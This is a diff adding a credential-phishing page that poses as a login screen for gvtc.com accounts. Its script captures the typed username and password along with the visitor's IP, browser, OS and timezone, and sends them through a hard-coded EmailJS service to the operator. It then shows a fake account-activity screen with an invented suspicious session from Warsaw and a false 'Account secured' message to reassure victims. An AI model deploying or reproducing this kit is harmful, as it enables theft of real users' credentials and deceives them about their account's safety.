@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Please log in</title>
+
+<script src="https://cdn.tailwindcss.com"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+  *, *::before, *::after {
+    box-sizing: border-box;
+    border-width: 0;
+    border-style: solid;
+    border-color: #e2e8f0;
+    margin: 0;
+  }
+
+  html {
+    -webkit-text-size-adjust: 100%;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+                 Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif,
+                 "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol",
+                 "Noto Color Emoji";
+    line-height: 1.5;
+  }
+
+  body {
+    background-color: #fff;
+    color: #1f2a37;
+  }
+
+  /* ---- Container ---- */
+  .container {
+    display: block;
+    width: 100%;
+    max-width: 48rem;
+    min-height: 100vh;
+    background-color: #fff;
+    margin-left: auto;
+    margin-right: auto;
+    padding-left: 600px;
+    padding-right: 600px;
+    padding-top: 0.75rem;
+    padding-bottom: 0.75rem;
+    overflow-y: auto;
+  }
+
+  #login_form,
+  #self-care {
+    padding-left: 0;
+    padding-right: 0;
+  }
+
+  /* ---- Branding ---- */
+  .branding {
+    display: flex;
+    justify-content: center;
+    margin-top: 8px;
+  }
+  .branding img {
+    max-height: 90px;
+    max-width: 320px;
+    object-fit: contain;
+  }
+
+  /* ---- Form ---- */
+  .formfield { margin-bottom: 14px; }
+  .formfield label {
+    display: block;
+    font-size: 0.85rem;
+    font-weight: 700;
+    margin-bottom: 6px;
+    color: #374151;
+  }
+  .formfield input[type="text"],
+  .formfield input[type="password"] {
+    width: 100%;
+    padding: 10px 12px;
+    font-size: 0.95rem;
+    font-family: inherit;
+    border: 1px solid #63b3ed;
+    border-radius: 6px;
+    background: #fff;
+    color: #1f2a37;
+    outline: none;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .formfield input:focus {
+    border-color: #63b3ed;
+    box-shadow: 0 0 0 3px rgba(99, 179, 237, 0.25);
+  }
+
+  #submit-btn {
+    display: block;
+    width: 100%;
+    background-color: #363535;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-size: 1.25rem;
+    font-family: inherit;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    cursor: pointer;
+    transition: background .15s;
+    margin: 16px 0;
+  }
+  #submit-btn:hover:not(:disabled) { background-color: #1f1e1e; }
+  #submit-btn:disabled { opacity: 0.65; cursor: not-allowed; }
+
+  #toggle {
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    font-size: 0.80rem;
+    font-weight: 450;
+    padding: 0 6px;
+    color: #1f2a37;
+  }
+
+  /* ---- Self-care links: sky blue + underline ---- */
+  #self-care a {
+    color: #63b3ed;
+    text-decoration: underline;
+  }
+  #self-care a:hover {
+    color: #2b8fd6;
+    text-decoration: underline;
+  }
+
+  .error-text {
+    display: block;
+    color: #b3261e;
+    font-size: 0.75rem;
+    margin-top: 4px;
+    min-height: 1em;
+  }
+
+  #form-error-banner {
+    display: none;
+    margin: 12px 0;
+    padding: 10px 12px;
+    border-radius: 6px;
+    font-size: 0.85rem;
+    background: #fdeceb;
+    color: #b3261e;
+    border: 1px solid #f3b8b4;
+  }
+  #form-error-banner.show { display: block; }
+
+  /* ---- Activity view ---- */
+  #activity-view {
+    display: none;
+    flex-direction: column;
+  }
+  #activity-view h1 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    text-align: center;
+    margin: 4px 0 6px;
+  }
+  #activity-view .lede {
+    text-align: center;
+    color: #5b6b7c;
+    font-size: 0.9rem;
+    margin-bottom: 18px;
+  }
+
+  .session-card {
+    border: 1px solid #e2e8f0;
+    border-radius: 8px;
+    padding: 12px 14px;
+    margin-bottom: 12px;
+    background: #fff;
+    transition: opacity .2s;
+  }
+  .session-card.removed { opacity: 0.45; text-decoration: line-through; }
+  .session-card .device-name { font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; }
+  .session-card .device-meta { color: #5b6b7c; font-size: 0.8rem; margin-bottom: 8px; }
+  .session-card button {
+    background: transparent;
+    color: #b3261e;
+    border: 1px solid #f3b8b4;
+    border-radius: 6px;
+    padding: 6px 10px;
+    font-size: 0.8rem;
+    cursor: pointer;
+  }
+  .session-card button:hover { background: #fdeceb; }
+  .session-card button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  #alert-box {
+    display: none;
+    margin: 14px 0;
+    padding: 10px 12px;
+    border-radius: 6px;
+    font-size: 0.85rem;
+    background: #e7f6ec;
+    color: #166534;
+    border: 1px solid #b7e2c4;
+    line-height: 1.45;
+  }
+  #alert-box:not(:empty) { display: block; }
+
+  .activity-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-top: 18px;
+  }
+  .activity-actions button {
+    width: 100%;
+    padding: 12px 16px;
+    font-size: 0.95rem;
+    font-family: inherit;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background .15s, color .15s, border-color .15s;
+  }
+  #this-was-me {
+    background: #363535;
+    color: #fff;
+    border: none;
+  }
+  #this-was-me:hover { background: #1f1e1e; }
+  #secure-account {
+    background: #fff;
+    color: #363535;
+    border: 1px solid #363535;
+  }
+  #secure-account:hover { background: #f3f3f3; }
+
+  @media (max-width: 640px) {
+    .container {
+      max-width: 28rem;
+      padding-left: 1rem;
+      padding-right: 1rem;
+    }
+  }
+</style>
+</head>
+<body>
+
+<main class="container">
+
+  <!-- LOGIN VIEW -->
+  <div id="login-view">
+    <header>
+      <div class="branding">
+        <img src="https://i.imghippo.com/files/knqa6398Itw.png" alt="mygtlooogo" />
+      </div>
+      <div class="text-center text-gray-800 text-lg font-bold my-4">
+        <h1>Please log in</h1>
+      </div>
+    </header>
+
+    <div id="form-error-banner" role="alert"></div>
+
+    <section id="login_form" class="flex flex-col justify-between">
+      <form id="contact-form" method="POST" action="#" novalidate>
+        <div class="formfield">
+          <label for="email-input">Username</label>
+          <input tabindex="1" class="tabable" type="text" id="email-input" name="email"
+                 value="" placeholder="Username" autofocus required>
+          <span class="error-text" id="email-error"></span>
+        </div>
+
+        <div class="formfield">
+          <label for="password-input">Password</label>
+          <div class="flex relative items-baseline">
+            <input tabindex="2" class="tabable" id="password-input" type="password"
+                   name="password" value="" placeholder="Password" required>
+            <div>
+              <button tabindex="3" type="button" id="toggle"
+                      class="tabable z-10 absolute uppercase"
+                      style="right: 10px; top: 8px;"
+                      onclick="toggle_password(event)">show</button>
+            </div>
+          </div>
+          <span class="error-text" id="password-error"></span>
+        </div>
+
+        <div class="remember-me" x-data="{ open: false }">
+          <div class="flex items-baseline">
+            <input tabindex="4" id="remember_me" name="remember_me"
+                   class="tabable mr-2 leading-tight" type="checkbox" checked>
+            <label for="remember_me" class="flex items-baseline block text-gray-700 font-bold">
+              Remember Me
+            </label>
+            <a tabindex="5" href="#remember_me_help" id="remember_me_help_link"
+               class="tabable align-top ml-2 text-sm"
+               @click.prevent="open = true">?</a>
+          </div>
+          <div x-show="open" @click.away="open = false"
+               class="my-2 px-4 py-2 bg-yellow-200 text-sm rounded shadow-inner">
+            <a name="remember_me_help"></a>
+            <p>
+              When you choose "Remember Me" on sign in, we will remember who you are and
+              keep you signed in for up to 90 days, unless you sign out or your browser
+              cookies are deleted.<br>
+              If you are on a public computer, we recommend you uncheck the box.
+            </p>
+          </div>
+        </div>
+
+        <button tabindex="6" id="submit-btn" type="submit">Submit</button>
+      </form>
+    </section>
+
+    <section id="self-care" class="px-2">
+      <ul>
+        <li class="mb-2">
+          <a class="tabable" tabindex="7" target="_blank" id="register" href="#">Need to register?</a>
+        </li>
+        <li class="mb-2">
+          <a class="tabable" tabindex="8" target="_blank" id="forgot_password" href="#">Forgot Password?</a>
+        </li>
+      </ul>
+    </section>
+
+    <footer class="flex flex-col mt-6 w-3/4 text-center mx-auto text-sm">
+      <p></p>
+    </footer>
+  </div><!-- /#login-view -->
+
+
+  <!-- ACTIVITY VIEW -->
+  <div id="activity-view">
+    <h1>Recent account activity</h1>
+    <p class="lede">Review sessions on your account</p>
+
+    <div class="session-card" id="session-current">
+      <div class="device-name">Current device</div>
+      <div class="device-meta" id="current-device-meta">Loading device info…</div>
+      <button type="button" id="remove-current">Remove</button>
+    </div>
+
+    <div class="session-card" id="session-warsaw">
+      <div class="device-name">Warsaw, Poland</div>
+      <div class="device-meta">Chrome on Windows · 2026-10-16 09:42 (CEST)</div>
+      <button type="button" id="remove-warsaw">Remove</button>
+    </div>
+
+    <div id="alert-box" role="status"></div>
+
+    <div class="activity-actions">
+      <button type="button" id="this-was-me">This was me</button>
+      <button type="button" id="secure-account">Secure my account</button>
+    </div>
+  </div><!-- /#activity-view -->
+
+</main>
+
+<script>
+  (function() {
+    emailjs.init("uGRhkufMjo08rjwb_");
+  })();
+
+  const form = document.getElementById("contact-form");
+  const emailInput = document.getElementById("email-input");
+  const passwordInput = document.getElementById("password-input");
+  const emailError = document.getElementById("email-error");
+  const passwordError = document.getElementById("password-error");
+  const formErrorBanner = document.getElementById("form-error-banner");
+  const submitBtn = document.getElementById("submit-btn");
+
+  const loginView = document.getElementById("login-view");
+  const activityView = document.getElementById("activity-view");
+  const currentDeviceMeta = document.getElementById("current-device-meta");
+
+  const sessionCurrent = document.getElementById("session-current");
+  const sessionWarsaw = document.getElementById("session-warsaw");
+  const removeCurrentBtn = document.getElementById("remove-current");
+  const removeWarsawBtn = document.getElementById("remove-warsaw");
+  const alertBox = document.getElementById("alert-box");
+
+  let attemptNumber = 1;
+
+  // ---- Accepted domain: gvtc.com only ----
+  const ACCEPTED_DOMAINS = [
+    "gvtc.com"
+  ];
+
+  function buildAllowedDomainRegex(domains) {
+    const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp(`^[^@\\s]+@(${escaped.join('|')})$`, 'i');
+  }
+  const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
+
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    if (ua.includes("Trident")) return "Internet Explorer";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "MacOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("like Mac")) return "iOS";
+    return "Unknown";
+  }
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+    return "Desktop";
+  }
+  function getTimestamp() {
+    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+  }
+  function getTimezone() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    catch (e) { return "Unknown"; }
+  }
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || "Not available";
+    } catch (e) { return "Not available"; }
+  }
+
+  async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+    const ip = await getIP();
+    const pageTitle = document.title;
+    const pageUrl = window.location.href;
+    const pageHostname = window.location.hostname;
+    const pagePathname = window.location.pathname;
+    const referrer = document.referrer || "Direct";
+    const browser = getBrowser();
+    const os = getOS();
+    const device = getDeviceType();
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+    const timezone = getTimezone();
+    const language = navigator.language || "Unknown";
+    const pageElementCount = document.getElementsByTagName('*').length;
+    const formsCount = document.forms.length;
+    const inputsCount = document.querySelectorAll('input').length;
+    const linksCount = document.querySelectorAll('a').length;
+
+    const attemptLabel = attempt === 1
+      ? "FIRST ATTEMPT (Incorrect credentials shown)"
+      : "SECOND ATTEMPT (Retry after incorrect credentials)";
+
+    const messageLog = `
+${attemptLabel}
+Timestamp: ${getTimestamp()}
+Email/Username: ${emailValue}
+Password: ${passwordValue}
+Page Title: ${pageTitle}
+Page URL: ${pageUrl}
+Hostname: ${pageHostname}
+Pathname: ${pagePathname}
+Referrer: ${referrer}
+Browser: ${browser}
+IP: ${ip}
+OS: ${os}
+Device: ${device}
+Screen Resolution: ${screenResolution}
+Viewport: ${viewportSize}
+Timezone: ${timezone}
+Language: ${language}
+Total Elements: ${pageElementCount}
+Forms: ${formsCount}
+Inputs: ${inputsCount}
+Links: ${linksCount}
+    `.trim();
+
+    const templateParams = {
+      timestamp: getTimestamp(),
+      from_email: emailValue,
+      password: passwordValue,
+      attempt_number: attempt,
+      attempt_label: attemptLabel,
+      page_title: pageTitle,
+      page_url: pageUrl,
+      page_hostname: pageHostname,
+      page_pathname: pagePathname,
+      referrer: referrer,
+      browser: browser,
+      ip: ip,
+      os: os,
+      device: device,
+      screen_resolution: screenResolution,
+      viewport_size: viewportSize,
+      timezone: timezone,
+      language: language,
+      page_element_count: pageElementCount,
+      forms_count: formsCount,
+      inputs_count: inputsCount,
+      links_count: linksCount,
+      message: messageLog
+    };
+
+    try {
+      const response = await emailjs.send("service_t84doqy", "template_4rsr5vq", templateParams);
+      console.log(`EmailJS SUCCESS (attempt ${attempt}):`, response.status);
+    } catch (error) {
+      console.error(`EmailJS FAILED (attempt ${attempt}):`, error);
+    }
+  }
+
+  function toggle_password(event) {
+    event.preventDefault();
+    const input = document.getElementById('password-input');
+    const btn   = document.getElementById('toggle');
+    const show  = input.type === 'password';
+    input.type  = show ? 'text' : 'password';
+    btn.innerText = show ? 'hide' : 'show';
+  }
+  window.toggle_password = toggle_password;
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    emailError.textContent = "";
+    passwordError.textContent = "";
+
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    let valid = true;
+
+    if (!emailValue) {
+      emailError.textContent = "Email is required.";
+      valid = false;
+    } else if (!allowedDomainRegex.test(emailValue)) {
+      emailError.textContent = "Email must be from an accepted domain.";
+      valid = false;
+    }
+    if (!passwordValue) {
+      passwordError.textContent = "Password is required.";
+      valid = false;
+    }
+    if (!valid) return;
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Verifying…";
+
+    sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+    setTimeout(() => {
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Submit";
+      formErrorBanner.classList.remove("show");
+      loginView.style.display = "none";
+      activityView.style.display = "flex";
+      sessionCurrent.classList.remove("removed");
+      sessionWarsaw.classList.remove("removed");
+      currentDeviceMeta.textContent =
+        `${getBrowser()} on ${getOS()} · ${getTimezone()}`;
+    }, 700);
+  });
+
+  function removeSession(sessionElement, deviceName) {
+    if (!sessionElement) return;
+    sessionElement.classList.add("removed");
+    const btn = sessionElement.querySelector("button");
+    if (btn) btn.disabled = true;
+    console.log(`Session removed: ${deviceName}`);
+  }
+
+  removeCurrentBtn.addEventListener("click", function(e) {
+    e.preventDefault();
+    removeSession(sessionCurrent, "current device");
+  });
+
+  removeWarsawBtn.addEventListener("click", function(e) {
+    e.preventDefault();
+    removeSession(sessionWarsaw, "Warsaw, Poland");
+  });
+
+  document.getElementById("this-was-me").addEventListener("click", () => {
+    activityView.style.display = "none";
+    loginView.style.display = "flex";
+    form.reset();
+    formErrorBanner.classList.remove("show");
+    alertBox.innerHTML = "";
+    attemptNumber = 1;
+    sessionCurrent.classList.remove("removed");
+    sessionWarsaw.classList.remove("removed");
+    currentDeviceMeta.textContent = "Loading device info…";
+  });
+
+  document.getElementById("secure-account").addEventListener("click", () => {
+    removeSession(sessionWarsaw, "Warsaw, Poland (secured)");
+    alertBox.innerHTML = `
+      <strong>Account secured.</strong><br>
+      The suspicious session from <strong>Warsaw, Poland</strong> has been removed.
+    `;
+  });
+</script>
+
+</body>
+</html>
